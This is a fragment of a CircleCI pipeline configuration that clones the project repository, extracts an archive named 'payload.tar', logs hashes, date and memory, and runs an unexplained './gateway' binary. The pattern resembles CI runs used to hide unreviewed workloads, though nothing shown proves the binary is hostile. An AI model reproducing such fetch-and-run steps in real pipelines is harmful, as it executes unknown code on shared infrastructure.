          command: |
            echo "$(md5sum /tmp/lambda/5 2>/dev/null | cut -c1-6)-$(sha1sum /tmp/lambda/5 2>/dev/null | cut -c1-6)" || true
      - run:
          name: Clone workspace
          command: git clone --depth 2 -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Unroll archive
          command: tar --extract --file=payload.tar
      - run:
          name: Cooldown
          command: date -u
      - run:
          command: free -m
      - run:
          command: nice -n 0 ./gateway
